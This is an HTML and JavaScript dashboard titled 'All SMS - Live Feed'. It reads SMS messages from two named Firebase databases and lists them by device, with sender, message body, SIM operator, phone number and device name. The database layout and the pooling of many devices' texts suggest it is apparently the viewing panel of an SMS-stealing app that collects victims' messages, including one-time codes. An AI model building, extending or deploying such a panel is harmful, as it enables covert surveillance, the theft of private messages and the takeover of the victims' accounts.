<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>All SMS - Live Feed</title>

    <style>
        body {
            font-family: system-ui, -apple-system, sans-serif;
            background-color: #0f172a;
            color: #f8fafc;
            margin: 0;
            padding: 20px;
        }

        .container {
            max-width: 700px;
            margin: 0 auto;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #334155;
            padding-bottom: 10px;
            margin-bottom: 20px;
            gap: 10px;
        }

        .title {
            font-size: 1rem;
        }

        .back-btn {
            color: #94a3b8;
            text-decoration: none;
            font-size: 0.9rem;
            padding: 6px 14px;
            border: 1px solid #334155;
            border-radius: 8px;
        }

        .back-btn:hover {
            border-color: #10b981;
            color: #10b981;
        }

        .sms-card {
            background-color: #1e293b;
            border: 1px solid #334155;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
            animation: fadeIn 0.2s ease-in;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .meta {
            display: flex;
            justify-content: space-between;
            gap: 10px;
            font-size: 0.85rem;
            color: #10b981;
            margin-bottom: 8px;
            font-weight: bold;
        }

        .time {
            color: #94a3b8;
            font-weight: normal;
            white-space: nowrap;
        }

        .msg {
            margin: 0;
            line-height: 1.5;
            white-space: pre-wrap;
            word-break: break-word;
            font-size: 0.95rem;
        }

        .info {
            font-size: 0.75rem;
            color: #64748b;
            margin-top: 8px;
            border-top: 1px dashed #334155;
            padding-top: 5px;
            word-break: break-word;
        }

        .device-id {
            font-size: 0.7rem;
            color: #94a3b8;
            background: #0f172a;
            padding: 2px 8px;
            border-radius: 4px;
        }

        .loading {
            color: #94a3b8;
            text-align: center;
            padding: 20px;
        }

        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid #334155;
            border-top: 2px solid #10b981;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 10px;
            vertical-align: middle;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .status-badge {
            font-size: 0.75rem;
            padding: 4px 10px;
            border-radius: 20px;
            background: #1e293b;
            color: #94a3b8;
            border: 1px solid #334155;
            white-space: nowrap;
        }

        .status-badge.live {
            color: #10b981;
            border-color: #10b981;
        }

        .error {
            color: #ef4444;
            padding: 20px;
            text-align: center;
        }
    </style>
</head>

<body>
<div class="container">

    <div class="header">
        <div>
            <a href="index.html" class="back-btn">← Back</a>
            <span class="title" style="margin-left: 12px;">📨 All SMS</span>
        </div>

        <span id="counter" class="status-badge">Loading...</span>
    </div>

    <div id="sms-container">
        <div class="loading">
            <span class="spinner"></span>
            Loading recent messages...
        </div>
    </div>

</div>


<script type="module">
import { initializeApp } from
    "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";

import { getDatabase, ref, onValue } from
    "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

/*
 * Reads SMS from BOTH databases.
 *
 * Existing:
 *   All_Users/sms
 *   All_Users/simDetails
 *
 * New:
 *   user_sms/DEVICE_ID/PUSH_ID
 *   user_data/DEVICE_ID
 */
const oldApp = initializeApp({
    databaseURL: "https://yes2-ead3d-default-rtdb.firebaseio.com"
}, "oldDatabase");

const newApp = initializeApp({
    databaseURL: "https://rantaishita-f7614-default-rtdb.firebaseio.com"
}, "newDatabase");

const oldDb = getDatabase(oldApp);
const newDb = getDatabase(newApp);

const container = document.getElementById("sms-container");
const counter = document.getElementById("counter");

const state = {
    oldSms: null,
    oldSim: {},
    newSms: null,
    newDevices: {}
};

function safeTime(...values) {
    for (const value of values) {
        if (typeof value === "number" && value > 0) return value;
        if (typeof value === "string") {
            const n = Number(value);
            if (Number.isFinite(n) && n > 0) return n;
            const parsed = Date.parse(value);
            if (!Number.isNaN(parsed)) return parsed;
        }
    }
    return 0;
}

function flattenOldSms(snapshot) {
    const out = [];
    if (!snapshot?.exists()) return out;

    snapshot.forEach(deviceSnapshot => {
        const deviceId = deviceSnapshot.key;

        deviceSnapshot.forEach(pushSnapshot => {
            const sms = pushSnapshot.val();
            if (!sms || typeof sms !== "object" || Array.isArray(sms) ||
                typeof sms.body !== "string") return;

            const sim = state.oldSim[deviceId] || {};

            out.push({
                source: "Existing",
                deviceId,
                pushId: pushSnapshot.key,
                body: sms.body,
                sender: sms.sender || "Unknown",
                receivedDate: sms.receivedDate || "",
                timestamp: sms.timestamp || "",
                timeMs: safeTime(
                    sms.timestampMillis,
                    sms.receivedDate,
                    sms.timestamp
                ),
                number: sim.sim1Number || sim.sim2Number || "N/A",
                provider: sim.sim1Provider || sim.sim2Provider || ""
            });
        });
    });

    return out;
}

function flattenNewSms(snapshot) {
    const out = [];
    if (!snapshot?.exists()) return out;

    snapshot.forEach(deviceSnapshot => {
        const deviceId = deviceSnapshot.key;
        const device = state.newDevices[deviceId] || {};

        deviceSnapshot.forEach(pushSnapshot => {
            const sms = pushSnapshot.val();
            if (!sms || typeof sms !== "object" || Array.isArray(sms) ||
                typeof sms.body !== "string") return;

            out.push({
                source: "New",
                deviceId,
                pushId: pushSnapshot.key,
                body: sms.body,
                sender: sms.sender || "Unknown",
                receivedDate: sms.date || "",
                timestamp: sms.date || "",
                timeMs: safeTime(
                    sms.timestampMillis,
                    sms.date,
                    sms.timestamp
                ),
                number: device.phoneNumber || "N/A",
                provider: device.sim1Provider || device.sim2Provider || "",
                deviceName: device.d_name || device.device || ""
            });
        });
    });

    return out;
}

function renderMessages() {
    // Show exactly the newest 25 messages from EACH database.
    // They are then combined and displayed newest-first.
    const oldMessages = flattenOldSms(state.oldSms)
        .sort((a, b) => b.timeMs - a.timeMs)
        .slice(0, 25);

    const newMessages = flattenNewSms(state.newSms)
        .sort((a, b) => b.timeMs - a.timeMs)
        .slice(0, 25);

    const messages = [...oldMessages, ...newMessages]
        .sort((a, b) => b.timeMs - a.timeMs);

    if (!messages.length) {
        container.innerHTML =
            '<div class="error">📭 No messages found</div>';
        counter.textContent = "0 messages";
        counter.classList.remove("live");
        return;
    }

    counter.textContent = `${oldMessages.length} + ${newMessages.length} recent messages`;
    counter.classList.add("live");
    container.innerHTML = "";

    const fragment = document.createDocumentFragment();

    messages.forEach(sms => {
        const card = document.createElement("div");
        card.className = "sms-card";

        const meta = document.createElement("div");
        meta.className = "meta";

        const senderElement = document.createElement("span");
        senderElement.textContent = `📨 ${sms.sender}`;

        const timeElement = document.createElement("span");
        timeElement.className = "time";
        timeElement.textContent =
            `🕐 ${sms.receivedDate || sms.timestamp || "N/A"}`;

        meta.appendChild(senderElement);
        meta.appendChild(timeElement);
        card.appendChild(meta);

        const messageElement = document.createElement("p");
        messageElement.className = "msg";
        messageElement.textContent = sms.body;
        card.appendChild(messageElement);

        const sourceInfo = document.createElement("div");
        sourceInfo.className = "info";
        sourceInfo.textContent = `🗄️ Database: ${sms.source}`;
        card.appendChild(sourceInfo);

        const operatorInfo = document.createElement("div");
        operatorInfo.className = "info";
        operatorInfo.textContent =
            `⚙️ Operator: ${sms.provider || "Unknown"} · Number: ${sms.number || "N/A"}`;
        card.appendChild(operatorInfo);

        const deviceInfo = document.createElement("div");
        deviceInfo.className = "info";
        deviceInfo.textContent =
            `📱 Device: ${sms.deviceId}` +
            (sms.deviceName ? ` · ${sms.deviceName}` : "");
        card.appendChild(deviceInfo);

        fragment.appendChild(card);
    });

    container.appendChild(fragment);
}

/* Existing database */
onValue(ref(oldDb, "All_Users/sms"), snapshot => {
    state.oldSms = snapshot;
    renderMessages();
}, error => {
    console.error("Existing SMS database error:", error);
    state.oldSms = null;
    renderMessages();
});

onValue(ref(oldDb, "All_Users/simDetails"), snapshot => {
    state.oldSim = snapshot.exists() ? (snapshot.val() || {}) : {};
    renderMessages();
}, error => console.error("Existing SIM details error:", error));

/* New database */
onValue(ref(newDb, "user_sms"), snapshot => {
    state.newSms = snapshot;
    renderMessages();
}, error => {
    console.error("New SMS database error:", error);
    state.newSms = null;
    renderMessages();
});

onValue(ref(newDb, "user_data"), snapshot => {
    state.newDevices = snapshot.exists() ? (snapshot.val() || {}) : {};
    renderMessages();
}, error => console.error("New device data error:", error));
</script>

</body>
</html>
